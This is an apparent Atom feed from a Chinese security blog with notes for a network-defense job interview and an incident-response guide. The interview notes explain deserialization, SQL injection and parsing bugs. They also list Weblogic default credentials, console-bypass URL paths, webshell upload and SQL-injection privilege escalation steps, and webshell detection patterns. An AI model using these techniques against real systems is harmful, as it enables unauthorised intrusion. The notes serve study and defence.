<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2023-07-31T17:55:42.493Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>护网面试总结</title>
    <link href="https://liu1272.github.io/2023/07/31/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/07/31/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</id>
    <published>2023-07-31T08:40:00.000Z</published>
    <updated>2023-07-31T17:55:42.493Z</updated>
    
    <content type="html"><![CDATA[<h5 id="首先看简历"><a href="#首先看简历" class="headerlink" title="首先看简历"></a>首先看简历</h5><p>简历不要乱吹，会什么就写什么；<br>只要你写在简历上的面试官都会着重问。</p><h5 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h5><p>基本上第一句是先让你做个自我介绍<br>你说的东西后面一定会问下去，所以建议说点项目或者设备的东西，先不要这么快上强度。</p><h5 id="判断恶意外连-分析威胁情报"><a href="#判断恶意外连-分析威胁情报" class="headerlink" title="判断恶意外连/分析威胁情报"></a>判断恶意外连/分析威胁情报</h5><ol><li>首先外连是从内到外</li><li>查看外连使用的协议</li><li>查看ip，看流量，看告警分析，看返回包、状态码</li></ol><h5 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h5><p><strong>Log4j</strong><br>Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。<br>该漏洞主要是由于日志在打印时当遇到<code>$&#123;</code>后，以<code>:</code>号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。</p><p>核心原理为，通过Lookup接口+LADP，从服务器请求下载了存在恶意payload的class文件，由于日志检测时，存在${则触发替换机制，导致了表达式被替换成了lookup查找到的恶意payload，在请求过程中被实例化解析执行了。</p><p>日志在打印时当遇到<code>$&#123;</code>后，Interpolator类以<code>:</code>号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过prefix去找对应的 lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行。</p><p>JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。</p><p><strong>Shiro</strong><br>shiro提供记住密码功能<br>Payload产生的过程：命令=》序列化=》AES加密=》base64编码=》RememberMe Cookie值<br>利用：用生成的Payload，构造数据包，伪造cookie发送payload<br>【SHIRO-550】<br>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：<br>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化<br>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞<br>【SHIRO-721】<br>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的<br>RememberMe cookie即可完成攻击<br>【两者区别】<br>shiro550使用可以使用已知密钥碰撞，但是shiro721由系统随机生成<br>550先验证”rememberMe” Cookie的值，再进行身份验证，因此可以绕过身份认证达成未授权访问<br>721登录时先进行身份验证，再验证”rememberMe” Cookie的值，所以需要一个可用的会话来利用<br>最后：shiro登录流程可以自定义</p><p><strong>weblogic</strong><br>weblogic就是把java应用程序运行起来，并提供服务的一种程序。</p><ol><li>weblogic控制台的7001端口，默认会开启T3协议服务，T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</li><li>weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</li></ol><p><strong>fastjson</strong><br>正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断<br>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数<br>【无回显怎么办】</p><ol><li>一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</li><li>通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</li><li>直接将命令执行结果回显到请求Poc的HTTP响应中</li></ol><p><strong>Jboss</strong><br>Jboss是一个管理EJB的容器和服务器。<br>下面是三个JBoss反序列化漏洞：<br>漏洞存在/jbossmq-httpil/HTTPServerILServlet中<br>漏洞存在/invoker/readonly中<br>漏洞存在/invoker/JMXInvokerServlet中<br>程序获取http请求数据保存到httpRequest中，进一步处理后保存到变量ois中，然后程序没有对该数据进行过滤，直接使用readObject()方法进行反序列化。</p><p><strong>Python</strong><br>Python内置了很多序列化/反序列化的方式，最常用的有json、pickle、marshal这三种。<br>json较为安全，因为它序列化后的字符串长度最小。<br>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。<strong>reduce</strong>()类似与PHP中的wakeup，在反序列化的时候会自动调用。<br>防御：<br>1、用更高级的接口__getnewargs()、getstate()、setstate()等代替reduce()魔术方法；<br>2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</p><p><strong>PHP</strong><br>以前的文章已经做出说明，不再重复叙述。</p><h5 id="有哪些常见的框架-中间件漏洞"><a href="#有哪些常见的框架-中间件漏洞" class="headerlink" title="有哪些常见的框架/中间件漏洞"></a>有哪些常见的框架/中间件漏洞</h5><p><strong>Python_Django</strong><br>目录遍历漏洞、重置密码漏洞、SQL注入漏洞、任意代码执行</p><p><strong>Python_Flask</strong><br>SSTI模板注入漏洞（后面再学习）</p><p><strong>Python_Web2py</strong><br>本地文件包含漏洞、输入验证漏洞</p><p><strong>Python_Tornado</strong><br>Tornado是非阻塞式服务器，而且速度相当快<br>文件读取漏洞：os.path.abspath函数获得的路径，是没有结尾处的”/“的，因此可以自己构造路径<br>模板注入漏洞：同样后面再学习</p><p><strong>Python_Scrapy</strong><br>scrapyd未授权访问漏洞:6800端口可以部署恶意的scrapy包到云服务，进而获取服务器权限<br>Scrapy反序例化漏洞</p><p><strong>struts2</strong><br>struts是java的web框架<br>在注册或登录页面，提交失败后一般会默认返回之前提交的数据<br>由于后端使用<code>%&#123;value&#125;</code>对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。<br>……</p><p><strong>weblogic</strong><br>weblogic是java的web框架<br>弱口令漏洞：</p><pre><code>用户名：weblogic、system、admin、WebLogic密码：weblogic、weblogic123、password、security、system、admin、WebLogic然后在上传处上传一个jsp类型的小马的war包来拿到shell</code></pre><p>任意文件读取漏洞：</p><pre><code>http://ip:7001/hello/file.jsp?path=  #接文件路径Weblogic 后台的密文与密钥这两个文件分别为 config.xml 和 SerializedSystemIni.dat</code></pre><p>未授权远程命令执行漏洞：</p><pre><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal或http://ip:7001/console/images/%252e%252e%252fconsole.portal或者构造一个反弹shell XML 文件，通过访问这个文件来执行命令</code></pre><h5 id="远程代码执行漏洞分类"><a href="#远程代码执行漏洞分类" class="headerlink" title="远程代码执行漏洞分类"></a>远程代码执行漏洞分类</h5><ol><li>直接调用系统函数例如exec</li><li>把序列化的包反序列化的时候调用不当出现了rce</li></ol><h5 id="常见反序列化的流量特征"><a href="#常见反序列化的流量特征" class="headerlink" title="常见反序列化的流量特征"></a>常见反序列化的流量特征</h5><p>shiro就看cookie中rememberMe字段，什么都要从这里传<br>fastjson：可以在提交的包中找找json格式的数据，重点看一下有无rmi或者出网的一些行为，（在十六进制中会呈现ACED开头，这段不确定）<br>st2-045：请求头中的Content-Type字段</p><h5 id="问漏洞题不会回答怎么办"><a href="#问漏洞题不会回答怎么办" class="headerlink" title="问漏洞题不会回答怎么办"></a>问漏洞题不会回答怎么办</h5><ol><li>先讲漏洞原理</li><li>漏洞特征，流量，返回码</li><li>结合设备特性讲</li></ol><h5 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h5><p><strong>报错注入</strong></p><pre><code>updatexml()         是mysql对xml文档数据进行查询和修改的xpath函数extractvalue()      是mysql对xml文档数据进行查询的xpath函数floor()             mysql中用来取整的函数exp()               此函数返回e(自然对数的底)指数X的幂值</code></pre><p><strong>时间盲注</strong></p><pre><code>sleep()             直接延迟时间benchmark()         通过计算md5消耗时间</code></pre><p><strong>堆叠植入</strong></p><pre><code>mysqli_multi_query()    可以使用;堆叠多条语句</code></pre><p><strong>宽字节注入</strong></p><pre><code>使用PHP连接Mysql的时候，当设置&quot;character_set_client=gbk&quot;时会导致一个编码转换的问题mysql在使用GBK编码的时候，会认为两个字符是一个汉字GBK就是常说的宽字节之一，实际上只有两个字节前一个ASCII码要大于128,才到汉字的范围</code></pre><p><strong>防护方案</strong></p><ol><li>预编译</li><li>限制长度</li><li>加WAF</li><li>通信加密<br>其中预编译：<br>因为sql注入是因为动态字符串的拼接导致sql命令发生改变，然后编译并且执行错误的结果。<br>而sql预处理则是提前“告诉”sql语法处理器，提前声明并且编译特定格式的sql语句，然后将所有用户的输入视为纯字符串参数，最后组成查询语句。</li></ol><p><strong>sql注入的进一步利用</strong></p><ol><li>拖库</li><li>在有绝对路径和into outfile函数时写shell到web目录下</li><li>服务器超管，获取服务器管理员权限</li><li>mssql2005之前在SQLsever利用xp_cmdshell提权</li><li>UDF提权是用户自定义函数，写一个恶意的dll到系统system32目录下（定义一个可以执行系统命令的函数）</li></ol><h5 id="常见的解析漏洞有哪些"><a href="#常见的解析漏洞有哪些" class="headerlink" title="常见的解析漏洞有哪些"></a>常见的解析漏洞有哪些</h5><ul><li>IIS 6.0   /xx.asp/xx.jpg “xx.asp”是文件夹名</li><li>IIS 7.0   /7.5默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</li><li>Nginx 版本小于等于 0.8.37，利用方法和IIS7.0/7.5一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx.jpg.php</li><li>Apache上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</li><li>lighttpd xx.jpg/xx.php，</li></ul><h5 id="ISS服务器要做哪些方面保护措施"><a href="#ISS服务器要做哪些方面保护措施" class="headerlink" title="ISS服务器要做哪些方面保护措施"></a>ISS服务器要做哪些方面保护措施</h5><ol><li>保持 Windows 升级:</li><li>使用 IIS 防范工具</li><li>移除缺省的 Web 站点</li><li>如果你并不需要 FTP 和 SMTP 服务，请卸载它们</li><li>有规则地检查你的管理员组和服务:</li><li>严格控制服务器的写访问权限</li><li>设置复杂的密码</li><li>减少/排除 Web 服务器上的共享</li><li>禁用 TCP/IP 协议中的 NetBIOS:</li><li>使用 TCP 端口阻塞</li><li>仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat</li><li>管理 IIS 目录安全:</li><li>使用 NTFS 安全:</li><li>管理用户账户</li><li>审计你的 Web 服务器</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;首先看简历&quot;&gt;&lt;a href=&quot;#首先看简历&quot; class=&quot;headerlink&quot; title=&quot;首先看简历&quot;&gt;&lt;/a&gt;首先看简历&lt;/h5&gt;&lt;p&gt;简历不要乱吹，会什么就写什么；&lt;br&gt;只要你写在简历上的面试官都会着重问。&lt;/p&gt;
&lt;h5 id=&quot;第一个问题&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>应急响应概述</title>
    <link href="https://liu1272.github.io/2023/07/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E8%BF%B0/"/>
    <id>https://liu1272.github.io/2023/07/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E8%BF%B0/</id>
    <published>2023-07-14T13:24:00.000Z</published>
    <updated>2023-07-28T14:35:37.294Z</updated>
    
    <content type="html"><![CDATA[<h3 id="应急响应概述"><a href="#应急响应概述" class="headerlink" title="应急响应概述"></a>应急响应概述</h3><h4 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h4><p>事件判断:判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS等等。<br>临时处置:给出客户临时处置建议，断网隔离，保护现场环境。<br>信息收集分析:收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析、样本分析。<br>清理处置:直接杀掉进程，删除文件，打补丁，抑或是修复文件。<br>产出报告:整理并输出完整的安全事件报告。</p><h4 id="常受攻击Web漏洞"><a href="#常受攻击Web漏洞" class="headerlink" title="常受攻击Web漏洞"></a>常受攻击Web漏洞</h4><table><thead><tr><th>攻击平台</th><th>漏洞编号</th></tr></thead><tbody><tr><td>Weblogic</td><td>CVE-2017-3248/CVE-2017-10271/CVE-2018-2628/CVE-2018-2894</td></tr><tr><td>Drupal</td><td>CVE-2018-7600/CVE-2018-7602</td></tr><tr><td>Struts2</td><td>CVE-2017-5638/CVE-2017-9805/CVE-2018-11776</td></tr><tr><td>ThinkPHP</td><td>ThinkPHPv5 GetShell</td></tr><tr><td>Windows Server</td><td>弱口令爆破/CVE-2017-0143</td></tr><tr><td>PHPStudy</td><td>弱口令爆破</td></tr><tr><td>PHPMyAdmin</td><td>弱口令爆破</td></tr><tr><td>MySQL</td><td>弱口令爆破</td></tr><tr><td>Tomcat</td><td>弱口令爆破/CVE-2017-12615</td></tr><tr><td>Spring Data Commons</td><td>CVE-2018-1273</td></tr><tr><td>Jekins</td><td>CVE-2019-1003000</td></tr><tr><td>JBoss</td><td>CVE-2010-0738/CVE-2017-12149</td></tr></tbody></table><h4 id="常受攻击组件漏洞"><a href="#常受攻击组件漏洞" class="headerlink" title="常受攻击组件漏洞"></a>常受攻击组件漏洞</h4><table><thead><tr><th>应用</th><th>漏洞名</th></tr></thead><tbody><tr><td>Docker</td><td>Docker未授权漏洞</td></tr><tr><td>Nexus Repository</td><td>Nexus Repository Manager 3远程代码执行漏洞</td></tr><tr><td>ElasticSearch</td><td>ElasticSearch未授权漏洞</td></tr><tr><td>Hadoop Yarn</td><td>Hadoop Yarn REST API未授权漏洞</td></tr><tr><td>Kubernetes</td><td>Kubernetes Api Server 未授权漏洞</td></tr><tr><td>Jenkins</td><td>Jenkins RCE(CVE-2019-1003000)</td></tr><tr><td>Spark</td><td>Spark REST API未授权漏洞</td></tr></tbody></table><h4 id="处置思路"><a href="#处置思路" class="headerlink" title="处置思路"></a>处置思路</h4><ol><li>找到webshell</li><li>确定攻击者IP（合理猜测）</li><li>回溯攻击者操作</li><li>梳理整个攻击过程（据实分析，积极沟通）</li></ol><h4 id="应急前沟通"><a href="#应急前沟通" class="headerlink" title="应急前沟通"></a>应急前沟通</h4><ul><li>现场现象是什么?如何发现的?(依据是什么) ?</li><li>什么时候发现的?</li><li>目前是否有做物理隔离(断网) ?</li><li>受害机器是哪个?</li><li>受害服务有几台?(1台/N台)</li><li>最先发现是哪台 ?</li><li>这台服务器对外有哪些服务?</li><li>这台服务器于其他机器是否处于同一个内网?</li><li>操作系统类型? </li><li>是否有公网映射业务? </li><li>远程管理方式? </li><li>网络边界有没有流量监控设备? </li><li>主机侧是否有EDR等安全设备</li></ul><h4 id="响应事件——Web攻击"><a href="#响应事件——Web攻击" class="headerlink" title="响应事件——Web攻击"></a>响应事件——Web攻击</h4><p><strong>相关表现:</strong> 页面被篡改、恶意推广、黑词黑页、webshell<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等app分享告警、首页敏感内容、拖库、内网沦陷等排查<br><strong>要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 备份文件;webshell后门查杀;web日志分析;web中间件缓存处理;web中间件配置检查;重启web中间件;服务器后门检查;<br><strong>防护措施:</strong> 加固相关web应用，修改相关系统的所有用户密码</p><h4 id="响应事件——链路劫持"><a href="#响应事件——链路劫持" class="headerlink" title="响应事件——链路劫持"></a>响应事件——链路劫持</h4><p><strong>相关表现:</strong> 区域性服务不可用或返回异常内容<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等app分享告警、首页敏感内容等<br><strong>排查要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 跨地区、运营商进行测试，确定受影响范围:在能复现的环境中判断是DNS劫持还是HTTP劫持<br><strong>防护措施:</strong> 重要业务部署https</p><h4 id="响应事件——代理隧道"><a href="#响应事件——代理隧道" class="headerlink" title="响应事件——代理隧道"></a>响应事件——代理隧道</h4><p><strong>相关表现:</strong> 持续性或间断性外连行为，通常为tcp协议，对内网多个主机有访问行为<br><strong>相关危害:</strong> 作为跳板机攻击其他内网资产<br><strong>排查要点:</strong> 确定存在代理隧道的跳板机，通常为某时间段内集中访问内网多种资源的机器，判断隧道类型<br><strong>防护措施:</strong> 完善内网acl，服务器按业务需要通过白名单策略访问外网</p><h4 id="响应事件——替换系统命令"><a href="#响应事件——替换系统命令" class="headerlink" title="响应事件——替换系统命令"></a>响应事件——替换系统命令</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面<br><strong>操作要点:</strong> 使用静态链接的busybox;重新安装被替换的包<br><strong>命令:</strong> </p><pre><code>rpm -Vadpkg --verify</code></pre><h4 id="响应事件——ld-so-preload动态链接库劫持"><a href="#响应事件——ld-so-preload动态链接库劫持" class="headerlink" title="响应事件——ld.so.preload动态链接库劫持"></a>响应事件——ld.so.preload动态链接库劫持</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 检查/etc/ld.so.preload，ld.so(如/lib/x86_64-linux-gnu/ld-2.27.so)<br><strong>操作要点:</strong> 使用静态链接的busybox; 重启被注入恶意模块的进程，必要时直接重启系统</p><h4 id="响应事件——内核态rootkit"><a href="#响应事件——内核态rootkit" class="headerlink" title="响应事件——内核态rootkit"></a>响应事件——内核态rootkit</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:隐藏文件、进程等信息<br><strong>排查要点:</strong> 确定是否存在无法使用常规命令查看的文件、进程;<br><strong>操作要点:</strong> 使用tyton内核态rootkit检测工具检测:检查/etc/modules是否有未知的内核模块</p><h4 id="响应事件——计划任务"><a href="#响应事件——计划任务" class="headerlink" title="响应事件——计划任务"></a>响应事件——计划任务</h4><p><strong>相关表现:</strong> 特定时间间隔触发木马、后门、网络链接、DNS请求、篡改页面等行为<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:周期性篡改页面、拉取数据等<br><strong>排查要点:</strong> 判断是否存在周期性出现的异常现象，检查/var/spool/cron/crontabs/，/etc/cron.*等常用计划任务配置文件<br><strong>操作要点:</strong> 停止计划任务服务后再操作;注意辨别利用\r回车符的障眼法小技巧</p><h4 id="响应事件——远控木马"><a href="#响应事件——远控木马" class="headerlink" title="响应事件——远控木马"></a>响应事件——远控木马</h4><p><strong>相关表现:</strong> 有持续或间断性的对外网络链接或DNS请求等通信行为<br><strong>相关危害:</strong> 窃取系统资料、作为跳板进一步攻击内网其他机器<br><strong>排查要点:</strong> 关注tcp、udp、icmp等一切网络行为，检查注册表、服务、开机目录、计划任务等一系列常见的持久化点<br><strong>操作要点:</strong> 检查网络连接，以及IDS设备上的异常远控告警</p><h3 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h3><h3 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><table><thead><tr><th>常用命令</th><th>说明</th></tr></thead><tbody><tr><td>regedit</td><td>注册表</td></tr><tr><td>Taskmgr</td><td>注册表</td></tr><tr><td>Msconfig</td><td>系统配置(包含启动项)</td></tr><tr><td>eventvwr.msc</td><td>事件查看器</td></tr><tr><td>compmgmt.msc</td><td>计算机管理(本地用户和组)</td></tr><tr><td>gpedit.msc</td><td>本地组策略</td></tr><tr><td>taskschd.msc</td><td>计划任务</td></tr><tr><td>lusrmgr.msc</td><td>本地用户和组</td></tr></tbody></table><pre><code>获取本机用户列表: net user本机管理员: net localgroup administrators查看当前会话: net session查看当前运行的服务: net start远程连接: net use查看当前用户下的共享目录: net share最近打开的文件:%UserProfile%\Recent          %APPDATA%\Microsoft\Windows\Recent          查找文件中的字符串: findstr /m /i /s &quot;hello&quot; *.txt查看网络连接: netstat - ano操作系统的详细配置信息: systeminfo获取系统进程信息: Wmic process根据应用程序查找PID: wmic process where name=&quot;cmd.exe”get processid,executablepath,name根据PID查找应用程序: wmic process where processid=&quot;4296”get executablepath,name获取系统进程信息:tasklist对于要查询特定dll的调用情况，可以使用命令tasklist /m dll名称计算样本MD5: certutil -hashfile %样本文件名% MD5</code></pre><h4 id="应急管理工具"><a href="#应急管理工具" class="headerlink" title="应急管理工具"></a>应急管理工具</h4><p><strong>PChunter</strong><br>系统信息监控工具，主要拿来看数字签名<br>黑色是微软认证的<br>粉红色是未认证的<br>红色是可疑进程</p><p><strong>Autoruns</strong><br>启动项、计划任务等动态监测工具</p><p><strong>Process Explorer</strong><br>应用程序监测工具<br>数据量很大，需要过滤</p><p><strong>TCPView</strong><br>其实就是<code>netstat -ano</code>的输出，但是可视化方便处理</p><p><strong>Microsoft Network Monitor</strong><br>很小的一个流量监控软件<br>安装完需要重启，可以监测单个程序进程</p><p><strong>D盾</strong><br>查杀webshell</p><p><strong>Everything</strong><br>快速查找文件和目录</p><p><strong>sysmon</strong><br>微软开发的系统监控工具，常用来判断挖矿后门等等</p><table><thead><tr><th>ID</th><th>说明</th></tr></thead><tbody><tr><td>Event ID 1</td><td>进程创建事件，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等</td></tr><tr><td>Event ID 3</td><td>网络连接事件，当恶意程序外连 CC 服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。</td></tr><tr><td>Event ID 11</td><td>文件创建事件，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用.，而这些目录正是初始感染阶段恶意运行要用到的目录</td></tr><tr><td>Event ID 22</td><td>记录 DNS 查询，容易受该功能影响的一种场景就是基于 DNS 的 C2 通信，其中大量请求会被记录下来</td></tr></tbody></table><p><strong>威胁分析平台</strong></p><p><strong>BeaconEye</strong><br>监测CS木马后门特征</p><p><strong>DumpIt</strong><br>内存取证工具，需要dump整个系统，取证空间占用太大，不建议使用<br>替代工具:<code>FTK Imager</code>和<code>WinPMem</code></p><p><strong>Volatility</strong><br>内存取证工具</p><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>windows主要有以下三类日志记录系统事件: 系统日志、安全日志、应用程序日志</p><pre><code>打开方式:1、开始 -&gt; 运行 -&gt; eventvwr2、开始-&gt; 管理工具 -&gt; 事件查看 -&gt; 安全</code></pre><p><strong>系统日志</strong><br>默认位置:%SystemRoot%System32WinevtLogsSystem.evtx</p><table><thead><tr><th>事件</th><th>ID</th></tr></thead><tbody><tr><td>系统启动</td><td>6005</td></tr><tr><td>事件日志服务已启动</td><td>6006</td></tr><tr><td>事件日志服务已停止</td><td>12</td></tr><tr><td>系统关闭</td><td>13</td></tr></tbody></table><p><strong>安全日志</strong><br>%SystemRoot%System32WinevtLogsSecurity.evtx<br>注意：不同版本的系统日志ID可能不同，建议自行查找<br><a href="https://smms.app/image/ZjJkrGV3hI9zd5i" target="_blank"><img src="https://s2.loli.net/2023/07/28/ZjJkrGV3hI9zd5i.png" width="400"></a></p><p><strong>应用程序日志</strong><br>%SystemRoot%System32WinevtLogsApplication.evtx</p><h3 id="Linux应急响应-1"><a href="#Linux应急响应-1" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h3><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><p><strong><code>top</code>和<code>ps -aux</code></strong><br>查看系统资源占用</p><p><strong><code>netstat -antpl</code></strong><br>查看网络连接以及其对应可执行程序</p><p><strong>lsof</strong><br>查看开放端口的进程</p><p><strong>登录信息查看</strong><br>显示错误的尝试登录信息: lastb<br>显示系统用户最近的登录信息: last<br>现实所有的用户最近的登录信息: lastlog</p><p><strong>grep</strong><br>查找符合条件的字符串:netstat -antpl lgrep 22</p><p><strong>crontab</strong><br>查看定时任务: crontab -1 、 cat /etc/crontab</p><p><strong>历史命令</strong><br>查看历史命令: history、cat ~/.bash history</p><p><strong>校验RPM软件包</strong><br>校验RPM软件包: rpm -Va、dpkg -verify<br>S：表示对应文件的大小 (Size) 不一致<br>M: 表示对于文件的mode不一致<br>5:表示对应文件的MD5不一致<br>D:表示文件的major和minor号不一致<br>L:表示文件的符号连接内容不一致<br>U:表示文件的owner不一致<br>G: 表示文件的group不一致<br>T:表示文件的修改时间不一致</p><p><strong>其它</strong><br>登录成功的IP<br>grep “Accepted” /var/log/secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>定位有爆破行为的IP<br>grep “Failed password” /var/log/secure awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>查看隐藏进程<br>ps -ef  awk ‘{print $11}’ | sort -n | uniq &gt;1<br>ls /proc | sort -n | uniq &gt;2<br>diff 1 2</p><h4 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h4><p><strong>BusyBox</strong><br>静态链接库的BusyBox<br>当命令被替换时使用<br>赋予可执行权限后.\即可</p><p><strong>chkrootkit</strong><br>监测RootKit的脚本</p><p><strong>Rkhunter</strong><br>同上</p><p><strong>unhide</strong><br>查找隐藏的UDP/TCP进程</p><p><strong>ClamAV</strong><br>检测各种恶意木马，病毒，进程<br>注意是否存在so文件的注入</p><p><strong>河马Webshell</strong></p><h4 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h4><p><a href="https://smms.app/image/PT3z2eDRXrnEfFA" target="_blank"><img src="https://s2.loli.net/2023/07/28/PT3z2eDRXrnEfFA.png" width="400"></a></p><p><a href="https://smms.app/image/QRHjtKZ7Ulh25iW" target="_blank"><img src="https://s2.loli.net/2023/07/28/QRHjtKZ7Ulh25iW.png" width="400"></a></p><p><a href="https://smms.app/image/uS1eGAtZMsj3p2n" target="_blank"><img src="https://s2.loli.net/2023/07/28/uS1eGAtZMsj3p2n.png" width="400"></a></p><p><a href="https://smms.app/image/j3QUfAiM6x1aJOR" target="_blank"><img src="https://s2.loli.net/2023/07/28/j3QUfAiM6x1aJOR.png" width="400"></a></p><p><strong>查找文件中的恶意/危险函数</strong></p><pre><code>PHP: eval(、system(、assert (JSP: getRunTime(、FileOutputStream(ASP: eval(、execute(、ExecuteGlobal (</code></pre><p><strong>从日志记录中查找</strong><br>查看每个 IP 地址访问次数:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c<br>访问URL排序:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c |sort -rn|head<br>访问指定资源日志:<br>cat access.log |awk ‘{print $7}’ |grep /%25Domain |sort|uniq - c |sort -rn|more</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;应急响应概述&quot;&gt;&lt;a href=&quot;#应急响应概述&quot; class=&quot;headerlink&quot; title=&quot;应急响应概述&quot;&gt;&lt;/a&gt;应急响应概述&lt;/h3&gt;&lt;h4 id=&quot;应急响应流程&quot;&gt;&lt;a href=&quot;#应急响应流程&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>红队总结</title>
    <link href="https://liu1272.github.io/2023/07/13/%E7%BA%A2%E9%98%9F%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/07/13/%E7%BA%A2%E9%98%9F%E6%80%BB%E7%BB%93/</id>
    <published>2023-07-13T12:26:00.000Z</published>
    <updated>2023-07-19T13:17:36.757Z</updated>
    
